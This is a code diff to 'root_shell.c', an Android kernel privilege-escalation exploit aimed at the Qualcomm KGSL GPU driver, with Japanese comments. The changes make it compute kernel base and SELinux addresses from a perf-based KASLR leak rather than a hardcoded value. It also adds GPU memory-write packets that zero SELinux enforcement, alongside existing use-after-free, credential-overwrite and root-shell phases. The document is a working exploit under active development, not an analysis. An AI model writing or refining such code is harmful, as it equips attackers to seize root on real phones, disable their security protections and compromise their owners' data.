@@ -1,4 +1,3 @@
-// root_shell.c
 #include "root_shell.h"
 
 static int kgsl_fd = -1;
@@ -31,7 +30,7 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-static uint64_t detect_kaslr(void) {
+static uint64_t detect_kaslr(uint64_t *base_out) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -81,9 +80,9 @@ static uint64_t detect_kaslr(void) {
 
     if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
 
-    // ベースアドレスを計算 (IP の下位 21 ビットをマスク)
     uint64_t base_addr = first_kernel_ip & ~0x1FFFFFULL;
     uint64_t init_cred_addr = base_addr + OFFSET_INIT_CRED;
+    *base_out = base_addr;
 
     printf("    base_addr=0x%lX init_cred=0x%lX\n",
         (unsigned long)base_addr, (unsigned long)init_cred_addr);
@@ -181,12 +180,18 @@ int main(int argc, char **argv) {
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
     printf("[*] Phase 0: Dynamic KASLR detection via perf\n");
-    uint64_t init_cred_addr = detect_kaslr();
+    uint64_t kernel_base;
+    uint64_t init_cred_addr = detect_kaslr(&kernel_base);
     if (!init_cred_addr) {
         printf("[-] Failed to detect init_cred, aborting\n");
         return 1;
     }
     printf("  init_cred=0x%lX\n", init_cred_addr);
+
+    uint64_t selinux_state_addr = kernel_base + OFFSET_SELINUX_STATE;
+    uint64_t selinux_enforcing_boot_addr = kernel_base + OFFSET_SELINUX_ENFORCING_BOOT;
+    printf("[*] Calculated selinux_state=0x%lX, enforcing_boot=0x%lX\n",
+        (unsigned long)selinux_state_addr, (unsigned long)selinux_enforcing_boot_addr);
 
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("[*] Phase 1: Setup rbtree\n");
@@ -334,10 +339,7 @@ int main(int argc, char **argv) {
     printf("\n[*] Phase 6 complete: found %d cred pages\n", n_cred);
 
     if (n_cred == 0) {
-        printf("[-] No cred pages found, trying alternative AVC bypass\n");
-        // ここで AVC bypass を試すか、終了
-        // 簡易的に AVC だけを試すコードは省略 (必要なら追加)
-        // 今回は終了
+        printf("[-] No cred pages found, aborting\n");
         return 1;
     }
 
@@ -378,19 +380,17 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    // 念のため SELinux も無効化 (AVC が効いていない場合の保険)
-    printf("[*] Phase 8: Disable SELinux (fallback)\n");
+    // ===== SELinux を確実に無効化 =====
+    printf("[*] Phase 8: Disable SELinux (write enforcing_boot and state)\n");
+
+    // 1) selinux_enforcing_boot を 0 に
     {
-        // selinux_enforcing_boot を 0 にする (アドレスは固定値ではなく、ベースから計算)
-        // ここでは固定値を使用 (ログから得た値ではないが、おそらく変わらない)
-        // 本当はベース+オフセットだが、手抜き
-        uint64_t enforcing_boot_addr = 0xFFFFFFEE883A7F14ULL; // 以前の固定値
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
         uint32_t al, ah;
-        split64(enforcing_boot_addr, &al, &ah);
+        split64(selinux_enforcing_boot_addr, &al, &ah);
         cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
         cmd[dw++] = al; cmd[dw++] = ah;
         cmd[dw++] = 0;
@@ -400,7 +400,30 @@ int main(int argc, char **argv) {
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
         flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
-        printf("[+] Fallback SELinux disable attempted\n");
+        printf("[+] selinux_enforcing_boot zeroed\n");
+    }
+
+    // 2) selinux_state の先頭 0x20 バイトをゼロクリア (enforcing フラグを含む)
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int off = 0; off < 0x20; off += 4) {
+            uint64_t addr = selinux_state_addr + off;
+            uint32_t al, ah;
+            split64(addr, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al; cmd[dw++] = ah;
+            cmd[dw++] = 0;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx_id, ts);
+        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        printf("[+] selinux_state zeroed (first 0x20 bytes)\n");
     }
 
     printf("[*] Phase 9: Cache eviction\n");
@@ -424,7 +447,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0, SELinux should be permissive) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
